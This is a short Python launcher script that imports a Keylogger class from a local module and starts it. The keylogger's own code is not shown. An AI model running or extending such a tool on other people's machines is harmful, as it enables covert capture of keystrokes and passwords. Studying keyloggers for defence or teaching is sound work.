import signal
import sys

from keylogger import Keylogger


def main():
    my_keylogger = Keylogger()
    my_keylogger.start()


if __name__ == "__main__":
    main()
